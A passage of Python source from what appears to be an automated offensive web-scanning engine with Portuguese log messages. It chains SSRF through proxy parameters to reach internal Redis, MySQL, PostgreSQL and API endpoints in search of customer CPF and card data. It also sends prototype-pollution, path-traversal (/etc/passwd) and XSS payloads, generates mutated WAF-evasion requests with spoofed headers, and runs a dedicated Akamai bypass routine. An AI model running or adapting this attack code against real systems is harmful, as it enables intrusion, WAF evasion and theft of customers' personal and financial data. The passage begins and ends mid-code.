        self.emit("hrd_phase", {
            "phase": "db_reflection",
            "ssrf_vectors": len(ssrf_successes),
            "chain_intel_redirect": self.chain_intel_ssrf_redirect,
        })

        db_reflection_targets = [
            {
                "name": "Redis KEYS Dump",
                "ssrf_url": "http://127.0.0.1:6379/KEYS/*",
                "detect": ["user:", "session:", "cart:", "order:", "cpf:", "card:", "token:"],
                "data_type": "session_keys",
            },
            {
                "name": "Redis GET user:1",
                "ssrf_url": "http://127.0.0.1:6379/GET/user:1",
                "detect": ["cpf", "cartao", "card", "email", "password", "nome", "name", "phone"],
                "data_type": "pii_data",
            },
            {
                "name": "Redis GET session:*",
                "ssrf_url": "http://127.0.0.1:6379/GET/session:current",
                "detect": ["userId", "user_id", "email", "role", "admin", "token", "jwt"],
                "data_type": "session_data",
            },
            {
                "name": "MySQL Information Schema",
                "ssrf_url": "http://127.0.0.1:3306/information_schema/tables",
                "detect": ["TABLE_NAME", "users", "orders", "payments", "customers", "cartoes"],
                "data_type": "db_schema",
            },
            {
                "name": "PostgreSQL pg_tables",
                "ssrf_url": "http://127.0.0.1:5432/pg_catalog/pg_tables",
                "detect": ["tablename", "users", "orders", "payments", "customers"],
                "data_type": "db_schema",
            },
            {
                "name": "Internal API Users Endpoint",
                "ssrf_url": "http://127.0.0.1:3000/api/users",
                "detect": ["cpf", "email", "cartao", "card_number", "phone", "address", "password"],
                "data_type": "pii_data",
            },
            {
                "name": "Internal API Orders/Payments",
                "ssrf_url": "http://127.0.0.1:3000/api/orders",
                "detect": ["cpf", "card", "total", "payment", "amount", "pix", "boleto"],
                "data_type": "financial_data",
            },
        ]

        ssrf_params = ["url", "src", "file", "path", "proxy", "fetch", "dest", "resource"]
        ssrf_endpoints = set()
        for f in ssrf_successes:
            ep = f.get("endpoint") or ""
            if ep and ep.startswith("/"):
                ssrf_endpoints.add(ep)
        for asset in self.exposed_assets[:5]:
            path = (asset.get("path") or asset.get("url") or "").lower()
            if any(kw in path for kw in ("/proxy", "/fetch", "/relay", "/forward")):
                ssrf_endpoints.add(path)
        if not ssrf_endpoints:
            if self.chain_intel_ssrf_redirect:
                ssrf_endpoints = {"/api/proxy", "/api/fetch"}
            else:
                self.log(
                    "[DB REFLECTION] No confirmed SSRF endpoints found  skipping reflection (requires validated SSRF pivot)",
                    "warn", "hacker_reasoning"
                )
                return
        ssrf_endpoints = list(ssrf_endpoints)[:4]

        for target in db_reflection_targets:
            for endpoint in ssrf_endpoints[:2]:
                for param in ssrf_params[:2]:
                    url = f"{self.base_url}{endpoint}?{param}={target['ssrf_url']}"
                    try:
                        start = time.time()
                        resp = await self.client.get(url, timeout=8.0, follow_redirects=True)
                        elapsed = int((time.time() - start) * 1000)
                        body = resp.text[:5000]

                        hit = any(kw.lower() in body.lower() for kw in target["detect"])

                        reflection_result = {
                            "service": target["name"],
                            "ssrf_url": target["ssrf_url"],
                            "via_endpoint": endpoint,
                            "via_param": param,
                            "status_code": resp.status_code,
                            "response_time_ms": elapsed,
                            "data_reflected": hit,
                            "data_type": target["data_type"],
                            "evidence": body[:400] if hit else "",
                        }
                        self.db_reflection_results.append(reflection_result)

                        if hit:
                            self.log(
                                f"[DB REFLECTION] âš¡ DATA CONFIRMED: {target['name']} via {endpoint}?{param}=  "
                                f"dados de clientes (CPF/CartÃ£o) AO ALCANCE!",
                                "error", "hacker_reasoning"
                            )
                            self.log(
                                f"[DB REFLECTION]   â†’ Data type: {target['data_type']} | "
                                f"Evidence: {body[:200]}",
                                "error", "hacker_reasoning"
                            )

                            severity = "critical" if target["data_type"] in ("pii_data", "financial_data") else "high"
                            self._emit_hrd_finding(
                                f"DB Reflection: {target['name']}  Customer Data Reachable",
                                f"DB Reflection confirmed data access to '{target['name']}' via "
                                f"SSRF at {endpoint}?{param}={target['ssrf_url']}. "
                                f"Data type: {target['data_type']}. "
                                f"Dados sensÃ­veis de clientes (CPF, CartÃ£o, sessÃµes) confirmados ao alcance "
                                f"via cadeia SSRF â†’ serviÃ§o interno â†’ banco de dados.",
                                severity, endpoint
                            )

                            self.data_captures.append({
                                "target": target["name"],
                                "reachable": True,
                                "data_type": target["data_type"],
                                "via": f"{endpoint}?{param}=",
                            })

                            self.add_probe({
                                "type": "db_reflection",
                                "service": target["name"],
                                "ssrf_url": target["ssrf_url"],
                                "endpoint": endpoint,
                                "param": param,
                                "status_code": resp.status_code,
                                "response_time_ms": elapsed,
                                "vulnerable": True,
                                "data_type": target["data_type"],
                                "evidence": body[:300],
                                "timestamp": _ts(),
                            })
                            break

                    except Exception:
                        continue

        confirmed_reflections = sum(1 for r in self.db_reflection_results if r["data_reflected"])
        pii_confirmed = sum(1 for r in self.db_reflection_results
                           if r["data_reflected"] and r["data_type"] in ("pii_data", "financial_data"))

        self.log(
            f"[DB REFLECTION] RESULTADO: {confirmed_reflections}/{len(self.db_reflection_results)} reflexÃµes confirmadas | "
            f"{pii_confirmed} com dados PII/financeiros",
            "error" if confirmed_reflections > 0 else "warn",
            "hacker_reasoning"
        )

        if pii_confirmed > 0:
            self.log(
                f"[THREAT] {pii_confirmed} serviÃ§os internos confirmam acesso a dados de clientes (CPF/CartÃ£o) "
                f"via cadeia SSRF  comprometimento de dados pessoais PROVADO",
                "error", "hacker_reasoning"
            )
        elif self.chain_intel_ssrf_redirect:
            self.log(
                "[DB REFLECTION] SSRF exploration executada (Data Drift redirect)  "
                "endpoints internos nÃ£o expostos ou bloqueados. Defensibilidade confirmada.",
                "warn", "hacker_reasoning"
            )

    async def _recursive_fallback(self):
        failed_probes = [c for c in self.confirmation_results if not c["confirmed"]]

        if not failed_probes and not self.matched_playbooks:
            self.log(
                "[HRD Â§4.5] RECURSIVE FALLBACK  No failed probes to retry  skipping",
                "info", "hacker_reasoning"
            )
            return

        self.log(
            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
            "error", "hacker_reasoning"
        )
        self.log(
            "â–ˆ RECURSIVE FALLBACK ENGINE v1.0  ADAPTIVE MUTATION â–ˆ",
            "error", "hacker_reasoning"
        )
        self.log(
            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
            "error", "hacker_reasoning"
        )
        self.log(
            "[FALLBACK] DicionÃ¡rio falhou. Ativando Fallback de IA: "
            "Gerando payloads adaptativos baseados no erro do servidor...",
            "error", "hacker_reasoning"
        )
        self.emit("hrd_phase", {
            "phase": "recursive_fallback",
            "failed_probes": len(failed_probes),
            "matched_playbooks": len(self.matched_playbooks),
        })

        error_captures: List[Dict] = []
        max_error_probes = 15
        probe_idx = 0

        test_endpoints = set()
        for mp in self.matched_playbooks:
            pb = mp["playbook"]
            for pivot in pb.pivot_routes[:3]:
                test_endpoints.add(pivot)
            test_endpoints.add(pb.route_pattern)
        for asset in self.exposed_assets[:10]:
            path = asset.get("path") or asset.get("url") or ""
            if path:
                test_endpoints.add(path)

        test_endpoints = list(test_endpoints)[:15]

        self.log(
            f"[FALLBACK] Â§1 ERROR HARVESTING  Probing {len(test_endpoints)} endpoints for server error signatures...",
            "warn", "hacker_reasoning"
        )

        test_payloads = [
            {"name": "type_confusion_array", "body": '{"id":[true,null,1],"admin":true}', "content_type": "application/json"},
            {"name": "prototype_pollution", "body": '{"__proto__":{"admin":true},"constructor":{"prototype":{"role":"admin"}}}', "content_type": "application/json"},
            {"name": "unicode_overflow", "body": '{"user":"\uff41\uff44\uff4d\uff49\uff4e","pass":"\uff50\uff41\uff53\uff53"}', "content_type": "application/json"},
            {"name": "null_byte_inject", "body": '{"file":"../../../etc/passwd\x00.jpg","type":"image"}', "content_type": "application/json"},
            {"name": "content_type_mismatch", "body": '<script>alert(1)</script>', "content_type": "text/plain"},
        ]

        for endpoint in test_endpoints:
            if probe_idx >= max_error_probes:
                break

            for tp in test_payloads[:2]:
                if probe_idx >= max_error_probes:
                    break

                probe_idx += 1
                url = f"{self.base_url}{endpoint}"

                try:
                    start = time.time()
                    resp = await self.client.post(
                        url,
                        content=tp["body"],
                        headers={"Content-Type": tp["content_type"]},
                        timeout=8.0,
                        follow_redirects=True,
                    )
                    elapsed = int((time.time() - start) * 1000)
                    body = resp.text[:5000]
                    headers_dict = dict(resp.headers)

                    if resp.status_code >= 400:
                        tech_profile = _identify_tech_from_response(
                            resp.status_code, headers_dict, body
                        )

                        capture = {
                            "endpoint": endpoint,
                            "payload_name": tp["name"],
                            "status_code": resp.status_code,
                            "response_length": len(body),
                            "response_body": body[:2000],
                            "response_time_ms": elapsed,
                            "tech_identified": tech_profile,
                            "headers_captured": {
                                k: v for k, v in headers_dict.items()
                                if k.lower() in ("server", "x-powered-by", "x-debug",
                                    "cf-ray", "x-vercel-id", "x-amz-cf-id",
                                    "x-request-id", "x-trace-id")
                            },
                        }
                        error_captures.append(capture)

                        if tech_profile:
                            tech_name = tech_profile["tech"]
                            if tech_name not in self.fallback_techs_identified:
                                self.fallback_techs_identified.append(tech_name)

                            self.log(
                                f"[FALLBACK] âš¡ TECH IDENTIFIED: {tech_name} at {endpoint} "
                                f"(HTTP {resp.status_code})  {tp['name']}",
                                "error", "hacker_reasoning"
                            )
                            self.log(
                                f"[FALLBACK] Response body captured: {len(body)} bytes  "
                                f"correlating with known {tech_name} vulnerabilities...",
                                "warn", "hacker_reasoning"
                            )

                            for bypass in tech_profile["known_bypasses"][:2]:
                                self.log(
                                    f"[FALLBACK]   â†’ KNOWN BYPASS: {bypass}",
                                    "error", "hacker_reasoning"
                                )
                        else:
                            self.log(
                                f"[FALLBACK] Error at {endpoint}  HTTP {resp.status_code} "
                                f"({len(body)} bytes)  tech unknown, proceeding with generic mutations",
                                "warn", "hacker_reasoning"
                            )

                        self.add_probe({
                            "type": "recursive_fallback_error_harvest",
                            "endpoint": endpoint,
                            "payload": tp["name"],
                            "status_code": resp.status_code,
                            "response_time_ms": elapsed,
                            "tech_identified": tech_profile["tech"] if tech_profile else "unknown",
                            "vulnerable": False,
                            "evidence": body[:300],
                            "timestamp": _ts(),
                        })

                except Exception:
                    pass

        if not error_captures:
            self.log(
                "[FALLBACK] No server errors captured  endpoints hardened or not reachable. "
                "Fallback skipping mutation phase.",
                "info", "hacker_reasoning"
            )
            self.fallback_results = []
            return

        self.log(
            f"[FALLBACK] Â§2 ADAPTIVE REASONING  Captured {len(error_captures)} error responses, "
            f"identified {len(self.fallback_techs_identified)} technologies: "
            f"{', '.join(self.fallback_techs_identified) if self.fallback_techs_identified else 'generic'}",
            "error", "hacker_reasoning"
        )

        self.log(
            f"[FALLBACK] Â§3 DYNAMIC PAYLOAD GENERATION  Generating 10 mutant variants per error endpoint "
            f"(JSON Type Confusion + WAF Evasion + Hybrid Mutations)...",
            "error", "hacker_reasoning"
        )
        self.emit("hrd_phase", {
            "phase": "fallback_mutation",
            "error_captures": len(error_captures),
            "techs_identified": self.fallback_techs_identified,
        })

        max_mutation_endpoints = 5
        mutation_attempts = 0
        mutation_successes = 0

        for capture in error_captures[:max_mutation_endpoints]:
            endpoint = capture["endpoint"]
            tech_profile = capture["tech_identified"] or {
                "key": "unknown",
                "tech": "Unknown",
                "known_bypasses": [],
                "evasion_focus": "content_type_confusion",
            }

            original_payload = capture.get("response_body", "")[:200]
            if not original_payload:
                original_payload = '{"id":1,"admin":false,"role":"user"}'

            mutants = _generate_mutant_payloads(
                original_payload, tech_profile, count=10
            )
            self.fallback_mutations_generated += len(mutants)

            self.log(
                f"[FALLBACK] â”â”â” MUTATION TARGET: {endpoint} ({tech_profile.get('tech', 'Unknown')}) â”â”â”",
                "error", "hacker_reasoning"
            )

            fallback_entry = {
                "endpoint": endpoint,
                "original_status": capture["status_code"],
                "tech_identified": tech_profile.get("tech", "unknown"),
                "tech_key": tech_profile.get("key", "unknown"),
                "evasion_focus": tech_profile.get("evasion_focus", "unknown"),
                "known_bypasses": tech_profile.get("known_bypasses", [])[:4],
                "mutations_sent": 0,
                "mutations_different_response": 0,
                "mutations_successful": 0,
                "mutation_results": [],
                "error_body_snippet": capture["response_body"][:500],
                "headers_captured": capture.get("headers_captured", {}),
            }

            for mutant in mutants:
                mutation_attempts += 1
                fallback_entry["mutations_sent"] += 1

                try:
                    url = f"{self.base_url}{endpoint}"
                    payload_body = mutant["payload"]

                    ct = "application/json"
                    if mutant["technique"] == "waf_evasion" and "content_type" in mutant:
                        ct = mutant.get("content_type", ct)

                    start = time.time()
                    resp = await self.client.post(
                        url,
                        content=payload_body,
                        headers={
                            "Content-Type": ct,
                            "X-HTTP-Method-Override": "PUT",
                            "X-Forwarded-For": "127.0.0.1",
                        },
                        timeout=8.0,
                        follow_redirects=True,
                    )
                    elapsed = int((time.time() - start) * 1000)
                    resp_body = resp.text[:3000]

                    status_changed = resp.status_code != capture["status_code"]
                    is_success = 200 <= resp.status_code < 300
                    body_diff = abs(len(resp_body) - capture["response_length"]) > 50

                    mutation_result = {
                        "index": mutant["index"],
                        "technique": mutant["technique"],
                        "generation": mutant["generation"],
                        "description": mutant["description"],
                        "status_code": resp.status_code,
                        "response_length": len(resp_body),
                        "response_time_ms": elapsed,
                        "status_changed": status_changed,
                        "body_changed": body_diff,
                        "is_success": is_success,
                    }

                    if status_changed or is_success:
                        fallback_entry["mutations_different_response"] += 1
                        log_level = "error"
                        verdict = "BEHAVIOR CHANGE"

                        if is_success:
                            fallback_entry["mutations_successful"] += 1
                            mutation_successes += 1
                            verdict = "BYPASS CONFIRMED"

                            self._emit_hrd_finding(
                                f"Recursive Fallback: {mutant['technique']} bypassed {tech_profile.get('tech', 'unknown')} at {endpoint}",
                                f"Original request returned HTTP {capture['status_code']}. "
                                f"Mutant Gen{mutant['generation']} ({mutant['technique']}) "
                                f"returned HTTP {resp.status_code}. "
                                f"Technology: {tech_profile.get('tech', 'unknown')}. "
                                f"Evasion focus: {tech_profile.get('evasion_focus', 'unknown')}. "
                                f"This indicates the WAF/server can be bypassed with {mutant['technique']} payloads.",
                                "critical" if is_success else "high",
                                endpoint,
                            )

                        self.log(
                            f"[FALLBACK] â–¸ Mutant #{mutant['index']} [{mutant['technique']}] Gen{mutant['generation']}: "
                            f"HTTP {capture['status_code']}â†’{resp.status_code}  {verdict}",
                            log_level, "hacker_reasoning"
                        )

                        mutation_result["verdict"] = verdict
                        mutation_result["evidence"] = resp_body[:300]

                        self.add_probe({
                            "type": "recursive_fallback_mutation",
                            "endpoint": endpoint,
                            "technique": mutant["technique"],
                            "generation": mutant["generation"],
                            "original_status": capture["status_code"],
                            "mutant_status": resp.status_code,
                            "vulnerable": is_success,
                            "verdict": verdict,
                            "evidence": resp_body[:300],
                            "timestamp": _ts(),
                        })
                    else:
                        self.log(
                            f"[FALLBACK]   Mutant #{mutant['index']} [{mutant['technique']}]: "
                            f"HTTP {resp.status_code}  same behavior, mutation ineffective",
                            "info", "hacker_reasoning"
                        )
                        mutation_result["verdict"] = "NO_CHANGE"

                    fallback_entry["mutation_results"].append(mutation_result)

                except Exception:
                    fallback_entry["mutation_results"].append({
                        "index": mutant["index"],
                        "technique": mutant["technique"],
                        "generation": mutant["generation"],
                        "verdict": "ERROR",
                        "error": "Request failed",
                    })

            self.fallback_results.append(fallback_entry)

            successful = fallback_entry["mutations_successful"]
            different = fallback_entry["mutations_different_response"]
            total = fallback_entry["mutations_sent"]

            self.log(
                f"[FALLBACK] Endpoint {endpoint}: {total} mutations â†’ "
                f"{different} behavior changes, {successful} bypasses confirmed",
                "error" if successful > 0 else ("warn" if different > 0 else "info"),
                "hacker_reasoning"
            )

        self.fallback_mutations_successful = mutation_successes

        akamai_detected = (
            self.waf_vendor.lower() == "akamai" or
            "Akamai WAF / CDN" in self.fallback_techs_identified or
            any("akamai" in (c.get("response_body") or "").lower() for c in error_captures) or
            any(c.get("tech_identified") and "akamai" in c["tech_identified"].get("tech", "").lower()
                for c in error_captures if isinstance(c.get("tech_identified"), dict))
        )
        all_dicts_failed = mutation_successes == 0 and len(error_captures) > 0
        akamai_403s = [c for c in error_captures if c["status_code"] == 403 and (
            akamai_detected or
            "akamai" in (c.get("response_body") or "").lower() or
            any(h.lower() in ("akamaighost", "akamai") for h in (c.get("headers_captured") or {}).values())
        )]

        if akamai_detected and all_dicts_failed and error_captures:
            self.log(
                "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
                "error", "hacker_reasoning"
            )
            self.log(
                "â–ˆ AKAMAI AI FALLBACK  POLYMORPHIC BYPASS ENGINE â–ˆ",
                "error", "hacker_reasoning"
            )
            self.log(
                "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”",
                "error", "hacker_reasoning"
            )
            self.log(
                "[AKAMAI AI] Todos os dicionÃ¡rios falharam. Motor de IA analisando erros 403 da Akamai  "
                "derivando payloads polimÃ³rficos de bypass especializados...",
                "error", "hacker_reasoning"
            )
            self.emit("hrd_phase", {
                "phase": "akamai_ai_fallback",
                "akamai_detected": akamai_detected,
                "all_dicts_failed": all_dicts_failed,
                "error_403_count": sum(1 for c in error_captures if c["status_code"] == 403),
            })

            akamai_403_endpoints = list(set(
                c["endpoint"] for c in akamai_403s
            ))[:5]

            if not akamai_403_endpoints:
                akamai_403_endpoints = list(set(
                    c["endpoint"] for c in error_captures if c["status_code"] == 403
                ))[:3]

            self.log(
                f"[AKAMAI AI] Â§1 ANÃLISE DE BLOQUEIO  {len(akamai_403_endpoints)} endpoints com 403 Forbidden. "
                f"Identificando padrÃµes de regra Akamai...",
                "warn", "hacker_reasoning"
            )

            for ep_403 in akamai_403_endpoints:
                ep_errors = [c for c in error_captures if c["endpoint"] == ep_403]
                self.log(
                    f"[AKAMAI AI]   â†’ {ep_403}: {len(ep_errors)} bloqueios, "
                    f"status codes: {set(c['status_code'] for c in ep_errors)}",
                    "warn", "hacker_reasoning"
                )

            self.log(
                f"[AKAMAI AI] Â§2 GERAÃ‡ÃƒO POLIMÃ“RFICA  LanÃ§ando {len(AKAMAI_POLYMORPHIC_GENERATORS)} "
                f"payloads especializados anti-Akamai...",
                "error", "hacker_reasoning"
            )

            akamai_successes = 0
            for ep in akamai_403_endpoints[:3]:
                for gen in AKAMAI_POLYMORPHIC_GENERATORS:
                    try:
                        url = f"{self.base_url}{ep}"
                        headers = {
                            "Content-Type": gen["content_type"],
                            "X-Forwarded-For": "127.0.0.1",
                            "X-Real-IP": "10.0.0.1",
                        }
                        if "headers" in gen:
                            headers.update(gen["headers"])

                        start = time.time()
                        resp = await self.client.post(
                            url,
                            content=gen["payload"],
                            headers=headers,
                            timeout=8.0,
                            follow_redirects=True,
                        )
                        elapsed = int((time.time() - start) * 1000)
                        resp_body = resp.text[:3000]

                        status_changed = resp.status_code != 403
                        is_success = 200 <= resp.status_code < 300

                        akamai_result = {
                            "endpoint": ep,
                            "generator": gen["name"],
                            "description": gen["description"],
                            "status_code": resp.status_code,
                            "original_status": 403,
                            "response_time_ms": elapsed,
                            "status_changed": status_changed,
                            "bypass_confirmed": is_success,
                            "verdict": "NO_CHANGE",
                        }

                        if is_success:
                            akamai_successes += 1
                            akamai_result["verdict"] = "AKAMAI BYPASS CONFIRMED"
                            akamai_result["evidence"] = resp_body[:300]
                            self.fallback_mutations_successful += 1

                            self.log(
                                f"[AKAMAI AI] âš¡ BYPASS CONFIRMED: {gen['name']} at {ep}  "
                                f"HTTP 403â†’{resp.status_code}!",
                                "error", "hacker_reasoning"
                            )
                            self._emit_hrd_finding(
                                f"Akamai WAF Bypass: {gen['name']} at {ep}",
                                f"Akamai AI Fallback confirmed WAF bypass using '{gen['description']}' technique. "
                                f"Original response: HTTP 403 Forbidden. Polymorphic payload returned HTTP {resp.status_code}. "
                                f"Akamai WAF rules can be evaded with {gen['name']} payloads.",
                                "critical", ep
                            )
                            self.add_probe({
                                "type": "akamai_ai_bypass",
                                "endpoint": ep,
                                "generator": gen["name"],
                                "original_status": 403,
                                "bypass_status": resp.status_code,
                                "vulnerable": True,
                                "verdict": "AKAMAI_BYPASS_CONFIRMED",
                                "evidence": resp_body[:300],
                                "timestamp": _ts(),
                            })

                        elif status_changed:
                            akamai_result["verdict"] = "BEHAVIOR CHANGE"
                            self.log(
                                f"[AKAMAI AI] â–¸ BEHAVIOR CHANGE: {gen['name']} at {ep}  "
                                f"HTTP 403â†’{resp.status_code} (nÃ£o Ã© bypass mas comportamento diferente)",
                                "warn", "hacker_reasoning"
                            )
                        else:
                            self.log(
                                f"[AKAMAI AI]   {gen['name']}: HTTP {resp.status_code}  blocked, mutaÃ§Ã£o ineficaz",
                                "info", "hacker_reasoning"
                            )

                        self.akamai_fallback_results.append(akamai_result)

                    except Exception:
                        self.akamai_fallback_results.append({
                            "endpoint": ep,
                            "generator": gen["name"],
                            "verdict": "ERROR",
                            "error": "Request failed",
                        })

            mutation_successes += akamai_successes
            self.fallback_mutations_generated += len(self.akamai_fallback_results)

            self.log(
                f"[AKAMAI AI] RESULTADO: {len(self.akamai_fallback_results)} payloads polimÃ³rficos testados | "
                f"{akamai_successes} bypasses confirmados",
                "error" if akamai_successes > 0 else "warn",
                "hacker_reasoning"
            )

            if akamai_successes > 0:
                self.log(
                    f"[THREAT] {akamai_successes} bypasses Akamai confirmados via motor de IA polimÃ³rfico  "
                    f"WAF Akamai vulnerÃ¡vel a tÃ©cnicas de evasÃ£o avanÃ§adas",
                    "error", "hacker_reasoning"
                )
            else:
                self.log(
                    "[BLOCK] Todos os payloads polimÃ³rficos anti-Akamai bloqueados  "
                    "WAF Akamai resistiu ao motor de IA. Defensibilidade mÃ¡xima.",
                    "warn", "hacker_reasoning"
                )

        self.log(
            "â”â”â” RECURSIVE FALLBACK  FINAL ASSESSMENT â”â”â”",
            "error", "hacker_reasoning"
        )
        self.log(
            f"[FALLBACK] Error captures: {len(error_captures)} | "
            f"Technologies: {', '.join(self.fallback_techs_identified) if self.fallback_techs_identified else 'none'} | "
            f"Mutations generated: {self.fallback_mutations_generated} | "
            f"Bypasses confirmed: {mutation_successes}",
            "error" if mutation_successes > 0 else "warn",
            "hacker_reasoning"
        )

        if mutation_successes > 0:
            self.log(
                f"[THREAT] {mutation_successes} WAF/server bypasses confirmed via adaptive mutation  "
                f"target is vulnerable to polymorphic attack chains",
                "error", "hacker_reasoning"
            )
        else:
            self.log(
                "[BLOCK] All mutations blocked  target resists adaptive fallback. "
                "Server-side validation appears robust against type confusion and WAF evasion.",
                "info", "hacker_reasoning"
            )

        self.emit("hrd_phase", {
            "phase": "fallback_complete",
            "mutations_generated": self.fallback_mutations_generated,
            "mutations_successful": mutation_successes,
            "techs_identified": self.fallback_techs_identified,
        })

    def _compute_escalation_graph(self):
        self.log(
            "[HRD Â§5] ESCALATION GRAPH  Computing attack path prioritization...",
            "warn", "hacker_reasoning"
        )

        if not self.escalation_paths:
            self.log(
                "[HRD] No escalation paths identified  target has limited attack surface",
                "info", "hacker_reasoning"
            )
            return

        for esc in self.escalation_paths:
            self.log(
                f"[HRD] ESCALATION: [{esc['phase'].upper()}] {esc['from_playbook']} â†’ {esc['escalation'][:80]}",
                "error", "hacker_reasoning"
            )

        critical_paths = [e for e in self.escalation_paths if any(
            kw in e["escalation"].lower()
            for kw in ["admin", "db", "rce", "credential", "dump", "total", "completo"]
        )]

        if critical_paths:
            self.log(
                f"[THREAT] {len(critical_paths)} CRITICAL escalation paths lead to full compromise",
                "error", "hacker_reasoning"
            )

        all_data_targets = set()
        for chain in self.reasoning_chains:
            all_data_targets.update(chain.get("data_targets", []))

        sensitive_targets = [t for t in all_data_targets if t.upper() in
            ("CPF", "CARTAO", "RG", "CNH", "PASSWORD_HASH", "CREDIT_CARD", "SESSION_TOKEN")]

        if sensitive_targets:
            self.log(
                f"[THREAT] Sensitive data targets in scope: {', '.join(sensitive_targets)}",
                "error", "hacker_reasoning"
            )
            self.data_captures = [{"target": t, "reachable": True} for t in sensitive_targets]

    def _emit_hrd_finding(self, title: str, desc: str, severity: str, endpoint: str):
        self.add_finding({
            "id": f"hrd-{hashlib.md5(title.encode()).hexdigest()[:8]}",
            "title": title,
            "description": desc,
            "severity": severity,
            "category": "Hacker Reasoning Dictionary",
            "endpoint": endpoint,
            "evidence": "Confirmed via HRD Kill Chain confirmation probe",
            "remediation": "Review the HRD playbook for this route and implement recommended mitigations",
            "phase": "hacker_reasoning",
        })

    def _absorb_incidents(self):
        self.log(
            "â”â”â” INCIDENT ABSORBER  DECISION DICTIONARY DUMP LOGIC â”â”â”",
            "error", "hacker_reasoning"
        )
        self.emit("hrd_phase", {"phase": "incident_absorber"})

        for finding in self.findings:
            self.incident_absorber.absorb(finding)

        for result in self.confirmation_results:
            self.incident_absorber.absorb_confirmation(result)

        for result in self.db_reflection_results:
            self.incident_absorber.absorb_db_reflection(result)

        absorber_data = self.incident_absorber.to_dict()
        total = absorber_data["total_incidents_absorbed"]
        unique = absorber_data["unique_evidence_entries"]
        blocked = absorber_data["blocked_secret_persistences"]

        if total > 0:
            self.log(
                f"[ABSORBER] {total} incidents absorbed â†’ {unique} unique evidence entries | "
                f"{blocked} raw secrets BLOCKED from persistence",
                "error", "hacker_reasoning"
            )

            by_vector = {}
            for ev in absorber_data["evidence_table"]:
                v = ev["attack_vector"]
                by_vector[v] = by_vector.get(v, 0) + 1

            for vector, count in by_vector.items():
                self.log(
                    f"[ABSORBER] {vector}: {count} evidence entries classified",
                    "warn", "hacker_reasoning"
                )

            self.emit("incident_absorber_report", absorber_data)
        else:
            self.log(
                "[ABSORBER] No critical/high incidents matched severity trigger  evidence table empty",
                "info", "hacker_reasoning"
            )

    def _build_report(self) -> Dict:
        confirmed_count = sum(1 for c in self.confirmation_results if c["confirmed"])
        critical_chains = sum(1 for c in self.reasoning_chains if c["threat_level"] == "critical")
        high_chains = sum(1 for c in self.reasoning_chains if c["threat_level"] == "high")

        self.log(
            "â”â”â” HACKER REASONING DICTIONARY  FINAL ASSESSMENT â”â”â”",
            "error", "hacker_reasoning"
        )
        self.log(
            f"[HRD] Playbooks matched: {len(self.matched_playbooks)} | "
            f"Reasoning steps: {self.total_reasoning_steps} | "
            f"Confirmations: {confirmed_count}/{len(self.confirmation_results)} | "
            f"Escalation paths: {len(self.escalation_paths)}",
            "error" if confirmed_count > 0 else "info",
            "hacker_reasoning"
        )

        if critical_chains > 0:
            self.log(
                f"[THREAT] {critical_chains} CRITICAL + {high_chains} HIGH kill chains identified  "
                f"target requires immediate security review",
                "error", "hacker_reasoning"
            )

        return {
            "engine": "hacker_reasoning_dictionary",
            "version": "1.0",
            "environment": {
                "waf_detected": self.waf_detected,
                "waf_vendor": self.waf_vendor,
                "infra_type": self.infra_type,
            },
            "playbooks_loaded": len(HACKER_REASONING_DICTIONARY),
            "playbooks_matched": len(self.matched_playbooks),
            "reasoning_chains_count": len(self.reasoning_chains),
            "total_reasoning_steps": self.total_reasoning_steps,
            "confirmed_probes": confirmed_count,
            "total_probes": len(self.confirmation_results),
            "escalation_paths_count": len(self.escalation_paths),
            "critical_chains": critical_chains,
            "high_chains": high_chains,
            "data_targets_in_scope": list(set(
                t for c in self.reasoning_chains for t in c.get("data_targets", [])
            )),
            "sensitive_data_reachable": len(self.data_captures),
            "reasoning_chains": [
                {
                    "key": c["playbook_key"],
                    "category": c["category"],
                    "threat_level": c["threat_level"],
                    "perspective": c["perspective"][:150],
                    "waf_evasion": c["waf_evasion"][:120],
                    "steps": c["steps"],
                    "data_targets": c["data_targets"][:6],
                    "pivot_routes": c["pivot_routes"][:4],
                }
                for c in self.reasoning_chains
            ],
            "confirmation_results": [
                {
                    "playbook": c["playbook_key"],
                    "indicator": c["indicator"],
                    "confirmed": c["confirmed"],
                    "evidence": c["evidence"][:150],
                }
                for c in self.confirmation_results
            ],
            "escalation_paths": self.escalation_paths[:20],
            "waf_defensibility": self.waf_defensibility,
            "subdomain_recon": {
                "activated": len(self.subdomain_recon_results) > 0,
                "subdomains_tested": len(self.subdomain_recon_results),
                "subdomains_accessible": sum(1 for r in self.subdomain_recon_results if r["accessible"]),
                "auth_bypasses": sum(1 for r in self.subdomain_recon_results if r.get("priority_finding") == "auth_bypass_confirmed"),
                "source_maps_found": sum(1 for r in self.subdomain_recon_results for m in r["source_map_results"] if m.get("found")),
                "results": [
                    {
                        "subdomain": r["subdomain"],
                        "accessible": r["accessible"],
                        "status_code": r.get("status_code"),
                        "priority_finding": r.get("priority_finding"),
                        "auth_bypass_count": sum(1 for a in r["auth_bypass_results"] if a.get("bypassed")),
                        "source_maps_count": sum(1 for m in r["source_map_results"] if m.get("found")),
                    }
                    for r in self.subdomain_recon_results
                ],
            },
            "db_reflection": {
                "activated": len(self.db_reflection_results) > 0,
                "chain_intel_redirect": self.chain_intel_ssrf_redirect,
                "data_drift_triggered": self.data_drift_triggered,
                "total_reflections": len(self.db_reflection_results),
                "confirmed_reflections": sum(1 for r in self.db_reflection_results if r["data_reflected"]),
                "pii_confirmed": sum(1 for r in self.db_reflection_results if r["data_reflected"] and r["data_type"] in ("pii_data", "financial_data")),
                "results": [
                    {
                        "service": r["service"],
                        "data_type": r["data_type"],
                        "data_reflected": r["data_reflected"],
                        "via_endpoint": r["via_endpoint"],
                        "status_code": r["status_code"],
                        "evidence": r.get("evidence", "")[:200],
                    }
                    for r in self.db_reflection_results
                    if r["data_reflected"]
                ][:10],
            },
            "akamai_ai_fallback": {
